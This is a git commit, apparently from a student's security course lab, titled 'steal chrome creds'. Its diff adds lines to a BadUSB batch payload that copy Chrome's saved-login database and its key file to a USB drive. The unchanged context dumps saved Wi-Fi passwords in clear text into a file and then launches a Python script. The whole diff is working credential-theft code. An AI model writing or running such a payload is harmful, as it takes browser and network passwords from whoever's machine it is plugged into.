add4c51be8e5c2f7c9e1e0bc8e1997d7b01a8ae3
Emile Villette <emile.villette@student.uclouvain.be>
2024-09-21 00:33:02 -0400

    steal chrome creds
    Signed-off-by: Emile Villette <emile.villette@student.uclouvain.be>

--- tp1/usb-payload/bad_usb/payload/start.bat
+++ tp1/usb-payload/bad_usb/payload/start.bat
@@ -1,4 +1,7 @@
 @echo off
+xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "I:\" /
+xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "I:\" /y
+
 for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wificreds.txt
 
 python try4.pyw
